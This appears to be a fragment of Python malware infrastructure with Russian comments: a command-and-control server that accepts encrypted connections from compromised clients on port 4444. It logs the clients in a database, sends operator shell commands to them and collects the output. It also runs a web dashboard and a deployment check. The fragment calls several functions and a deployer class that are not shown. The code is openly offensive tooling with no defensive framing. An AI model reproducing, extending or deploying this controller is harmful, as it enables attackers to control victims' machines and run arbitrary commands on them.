# 2. advanced_c2_controller.py - Улучшенный C2 контроллер с веб-интерфейсом
import socket
import threading
import sqlite3
import logging
from datetime import datetime
import json
from cryptography.fernet import Fernet
import http.server
import socketserver

# Загрузка конфигурации
try:
    from c2_config import *
except:
    C2_SERVER = "0.0.0.0"
    C2_PORT = 4444
    ENCRYPTION_KEY = Fernet.generate_key()

class C2Database:
    """База данных для управления клиентами"""
    def __init__(self):
        self.conn = sqlite3.connect('c2_clients.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY,
                ip_address TEXT,
                hostname TEXT,
                os TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY,
                client_id INTEGER,
                command TEXT,
                result TEXT,
                timestamp TEXT
            )
        ''')
        self.conn.commit()

class AdvancedC2Controller:
    def __init__(self):
        self.db = C2Database()
        self.clients = {}
        self.encryption_key = ENCRYPTION_KEY
        self.cipher = Fernet(self.encryption_key)
        
        # Настройка логирования
        logging.basicConfig(
            filename='c2_server.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
    
    def start_web_interface(self, port=8080):
        """Запуск веб-интерфейса для управления"""
        class C2WebHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/dashboard':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    dashboard_html = """
                    <html>
                    <head><title>C2 Dashboard</title></head>
                    <body>
                        <h1>C2 Command Center</h1>
                        <div id="clients"></div>
                        <script>
                            fetch('/api/clients')
                                .then(r => r.json())
                                .then(data => {
                                    document.getElementById('clients').innerHTML = 
                                        JSON.stringify(data, null, 2);
                                });
                        </script>
                    </body>
                    </html>
                    """
                    self.wfile.write(dashboard_html.encode())
                else:
                    super().do_GET()
        
        web_thread = threading.Thread(target=lambda: socketserver.TCPServer(
            ("", port), C2WebHandler).serve_forever())
        web_thread.daemon = True
        web_thread.start()
        print(f"[+] Web interface started on port {port}")

    def handle_client(self, client_socket, address):
        """Обработка подключения клиента"""
        try:
            # Обмен ключами
            client_key = client_socket.recv(44)
            client_cipher = Fernet(client_key)
            
            # Регистрация клиента
            client_info = {
                'ip': address[0],
                'connect_time': datetime.now().isoformat(),
                'cipher': client_cipher
            }
            self.clients[address[0]] = client_info
            
            logging.info(f"New client connected: {address[0]}")
            print(f"[+] Client connected: {address[0]}")
            
            while True:
                # Получение команды от оператора
                command = input(f"C2[{address[0]}]> ")
                
                if command == "exit":
                    break
                elif command == "info":
                    # Запрос информации о системе
                    encrypted_cmd = client_cipher.encrypt(b"sysinfo")
                    client_socket.send(encrypted_cmd)
                    
                    response = client_socket.recv(65536)
                    if response:
                        decrypted = client_cipher.decrypt(response)
                        print(decrypted.decode())
                
                elif command.startswith("cmd "):
                    # Выполнение CMD команды
                    cmd_text = command[4:]
                    encrypted_cmd = client_cipher.encrypt(f"cmd {cmd_text}".encode())
                    client_socket.send(encrypted_cmd)
                    
                    response = client_socket.recv(65536)
                    if response:
                        decrypted = client_cipher.decrypt(response)
                        print(decrypted.decode())
                
                else:
                    # Стандартная команда
                    encrypted_cmd = client_cipher.encrypt(command.encode())
                    client_socket.send(encrypted_cmd)
                    
                    response = client_socket.recv(65536)
                    if response:
                        decrypted = client_cipher.decrypt(response)
                        print(decrypted.decode())
                        
        except Exception as e:
            logging.error(f"Client {address[0]} error: {e}")
        finally:
            if address[0] in self.clients:
                del self.clients[address[0]]
            client_socket.close()

    def start_server(self):
        """Запуск основного сервера"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((C2_SERVER, C2_PORT))
            server.listen(10)
            
            print(f"[*] Advanced C2 Server started on {C2_SERVER}:{C2_PORT}")
            print("[*] Waiting for connections...")
            logging.info(f"C2 Server started on port {C2_PORT}")
            
            # Запуск веб-интерфейса
            self.start_web_interface()
            
            while True:
                client_socket, address = server.accept()
                
                # Запуск отдельного потока для каждого клиента
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except Exception as e:
            logging.error(f"Server error: {e}")
            print(f"[-] Server error: {e}")
        finally:
            server.close()

# 3. deployment_check.py - Скрипт проверки развертывания
def check_deployment():
    """Проверка корректности развертывания"""
    checks = [
        ("Port 4444 available", lambda: check_port(4444)),
        ("Python dependencies", lambda: check_dependencies()),
        ("External connectivity", lambda: check_external_connectivity()),
        ("Encryption keys", lambda: check_encryption())
    ]
    
    print("=== DEPLOYMENT CHECK ===")
    for check_name, check_func in checks:
        try:
            result = check_func()
            print(f"[✓] {check_name}: OK")
        except Exception as e:
            print(f"[✗] {check_name}: FAILED - {e}")

def check_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(('0.0.0.0', port))
        return True
    except OSError:
        return False
    finally:
        sock.close()

def check_dependencies():
    required = ['cryptography', 'fernet', 'socket', 'threading']
    for dep in required:
        try:
            __import__(dep)
        except ImportError:
            return False
    return True

if __name__ == "__main__":
    # Запуск автоматического деплоймента
    deployer = C2Deployer()
    deployer.main()
    
    # Проверка развертывания
    check_deployment()
    
    # Запуск сервера
    controller = AdvancedC2Controller()
    controller.start_server()